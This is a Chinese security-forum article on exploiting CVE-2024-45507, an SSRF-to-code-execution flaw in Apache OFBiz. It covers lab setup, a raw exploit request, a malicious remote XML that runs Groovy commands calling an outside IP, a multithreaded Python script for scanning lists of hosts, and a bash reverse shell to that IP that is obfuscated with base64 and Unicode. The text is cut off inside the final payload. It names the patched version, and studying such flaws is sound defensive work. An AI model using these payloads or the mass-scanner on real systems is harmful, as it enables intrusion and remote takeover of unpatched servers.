---
title: CVE-2024-45507漏洞利用实战：代码分析与自动化检测工具
url: https://forum.butian.net/share/4110
source: 奇安信攻防社区
date: 2025-02-11
fetch_date: 2025-10-06T20:32:31.019440
---

# CVE-2024-45507漏洞利用实战：代码分析与自动化检测工具

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### CVE-2024-45507漏洞利用实战：代码分析与自动化检测工具

* [漏洞分析](https://forum.butian.net/topic/48)

该项目是一个开源的电子商务平台，提供创建基于最新的J2EE/XML规范和技术标准。各模块之间的功能比较松散，用户可以根据自己的需求进行拆卸整合，非常灵活。该漏洞属于Apache OFBiz中的服务器端请求伪造SSRF漏洞，目前升级到18.12.16版本即可修复该问题。

Apache OFBiz介绍
==============
该项目是一个开源的电子商务平台，提供创建基于最新的J2EE/XML规范和技术标准。各模块之间的功能比较松散，用户可以根据自己的需求进行拆卸整合，非常灵活。
漏洞描述
====
该漏洞属于Apache OFBiz中的服务器端请求伪造SSRF漏洞，目前升级到18.12.16版本即可修复该问题。
漏洞影响范围
======
version &lt; 18.12.16
源码下载
====
<https://github.com/apache/ofbiz-framework/archive/refs/tags/release18.12.12.tar.gz>
环境搭建
====
这里我是用Debian进行搭建，我们直接运行目录下的gradlew文件，如果是Windows系统就需要运行gradlew.bat
安装：
./gradle/init-gradle-wrapper.sh
./gradlew cleanAll loadAll
./gradlew cleanAll "ofbiz --load-data readers=seed,seed-initial" loadAdminUserLogin -PuserLoginId=admin
如果访问不了可以尝试添加可以访问的白名单
vim framework/security/config/security.properties
找到host-headers-allowed添加访问时的IP头
运行之前记得先加上执行权限
![](https://cdn.nlark.com/yuque/0/2024/png/35564863/1727405248855-474461b8-216d-4ff7-aa2b-8a98fae8a463.png)
最后运行命令：
./gradlew ofbiz
![](https://cdn.nlark.com/yuque/0/2024/png/35564863/1727405289367-987e2c86-506f-46ef-b1a9-927328e4555b.png)
之后出现这样的提示，我们就需要等大概几分钟，让他加载，直到提示
![](https://cdn.nlark.com/yuque/0/2024/png/35564863/1727405322117-b0fbd1f4-8fc8-4867-b539-f3a0fc7d058a.png)
这样就可以了。
访问靶机的IP地址
财务登录：<https://192.168.195.130:8443/accounting>
管理员地址：<https://localhost:8443/webtools>
订单登录：<https://localhost:8443/ordermgr>
默认登录用户名密码：admin/ofbiz
漏洞利用
====
漏洞是通过ssrf方式进行入侵，也就是说我们需要通过对方服务器，对外发起请求，那么我们就需要在一台服务器上，架设一个XML文件，用以对方远程加载，同时XML文件中包含命令执行语句，以此来加载RCE操作。
复现测试
----
这里我配置之后，通过发送数据包
```php
POST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1
Host: 192.168.195.130:8443
Content-Length: 55
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
Origin: https://192.168.195.130:8443
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://192.168.195.130:8443/webtools/control/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
statsDecoratorLocation=http://101.43.1.181:8000
```
![](https://cdn.nlark.com/yuque/0/2024/png/35564863/1727664368914-6a33615c-beef-4b01-97bb-1abe7985a972.png)
![](https://cdn.nlark.com/yuque/0/2024/png/35564863/1727664343038-d16d2442-e36e-46be-a00a-37794ba40cd3.png)
这里编写一个测试的rce.xml，测试看看是否可以远程执行我的xml中的命令
```php
<?xml version="1.0" encoding="UTF-8"?>
<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns="http://ofbiz.apache.org/Widget-Screen" xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd">
<screen name="StatsDecorator">
<section>
<actions>
<set value="${groovy:'curl 101.43.1.181:8888'.execute();}"/>
</actions>
</section>
</screen>
</screens>
```
我这里首先在我服务器中开启python的远程下载服务，配置8000端口，提供xml进行远程执行，执行命令为访问我服务器的8888端口，同时我开始python远程8888端口来监测命令是否执行。
![](https://cdn.nlark.com/yuque/0/2024/gif/35564863/1727665786407-7ca40747-69bc-49bd-8593-bb640f6d9743.gif)
可以成功的访问并且执行。
Payload编写
---------
payload编写这里，我使用python进行模拟发包
```php
#!/usr/bin/env python3
import requests
import re
import urllib3
import concurrent.futures
# 忽略不安全的 HTTPS 请求警告
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
# 读取 IP 地址
with open('ip.txt', 'r') as file:
ips = file.read().splitlines()
url\_template = "https://{ip}:8443/webtools/control/forgotPassword/StatsSinceStart"
headers = {
"Content-Length": "55",
"Cache-Control": "max-age=0",
"Sec-Ch-Ua": '"Chromium";v="127", "Not)A;Brand";v="99"',
"Sec-Ch-Ua-Mobile": "?0",
"Sec-Ch-Ua-Platform": '"Windows"',
"Accept-Language": "zh-CN",
"Upgrade-Insecure-Requests": "1",
"Content-Type": "application/x-www-form-urlencoded",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "navigate",
"Sec-Fetch-User": "?1",
"Sec-Fetch-Dest": "document",
"Accept-Encoding": "gzip, deflate, br",
"Connection": "keep-alive"
}
data = {
"statsDecoratorLocation": "http://101.43.1.181:8000/rce.xml"
}
# 正则表达式用于完全匹配特定字符串
pattern = re.compile(r"<!-- Begin Screen http://101\.43\.1\.181:8000/rce\.xml#StatsDecorator -->")
matched\_ips = []
# 发送请求的函数
def send\_request(ip):
url = url\_template.format(ip=ip)
headers["Origin"] = f"https://{ip}:8443"
headers["Referer"] = f"https://{ip}:8443/webtools/control/login"
try:
response = requests.post(url, headers=headers, data=data, verify=False) # verify=False 禁用 SSL 验证
# 检查回显包是否包含指定的完全匹配内容
if pattern.search(response.text):
print(f"Matched response from {ip}")
return ip
else:
print(f"No match for {ip}")
return None
except requests.exceptions.RequestException as e:
print(f"Error connecting to {ip}: {e}")
return None
# 使用多线程执行请求，max\_workers设置线程数量
with concurrent.futures.ThreadPoolExecutor(max\_workers=10) as executor:
futures = [executor.submit(send\_request, ip) for ip in ips]
for future in concurrent.futures.as\_completed(futures):
result = future.result()
if result:
matched\_ips.append(result)
# 将匹配的 IP 地址输出到 out.txt
if matched\_ips:
with open('out.txt', 'w') as outfile:
outfile.write("\n".join(matched\_ips))
print("Matching IPs have been written to out.txt")
else:
print("No IP returned a matching response.")
```
EXP编写
-----
首先我们需要反弹shell的命令
bash -i &gt;&amp; /dev/tcp/101.43.1.181/9999 0&gt;&amp;1
然后将这个shell进行base64加密
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMS4xODEvOTk5OSAwPiYx
再将这个base64加密后的放置在下面的代码中
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMS4xODEvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}
最后将上面的代码进行Unicode加密
\\u0062\\u0061\\u0073\\u0068\\u0020\\u002D\\u0063\\u0020\\u007B\\u0065\\u0063\\u0068\\u006F\\u002C\\u0059\\u006D\\u0046\\u007A\\u0061\\u0043\\u0041\\u0074\\u0061\\u0053\\u0041\\u002B\\u004A\\u0069\\u0041\\u0076\\u005A\\u0047\\u0056\\u0032\\u004C\\u0033\\u0052\\u006A\\u0063\\u0043\\u0038\\u0078\\u004D\\u0044\\u0045\\u0075\\u004E\\u0044\\u004D\\u0075\\u004D\\u0053\\u0034\\u0078\\u004F\\u0044\\u0045\\u0076\\u004F\\u0054\\u006B\\u0035\\u004F\\u0053\\u0041\\u0077\\u0050\\u0069\\u0059\\u0078\\u007D\\u007C\\u007B\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002C\\u002D\\u0064\\u007D\\u007C\\u007B\\u0062\\u0061\\u0073\\u0068\\u002C\\u002D\\u0069\\u007D
该漏洞目前已知情况是需要出网的，我们在攻击之前需要在攻击的主机上架设xml来远程加载执行。
```php
<?xml version="1.0" encoding="UTF-8"?>
<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns="http://ofbiz.apache.org/Widget-Screen" xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd">
<screen name="StatsDecorator">
<section>
<actions>
<set value="${groovy:'\u0062\u0061\u0073\u0068\u0020\u002D\u0063\u0020\u007B\u0065\u0063\u0068\u006F\u002C\u0059\u006D\u0046\u007A\u0061\u0043\u0041\u0074\u0061\u0053\u0041\u002B...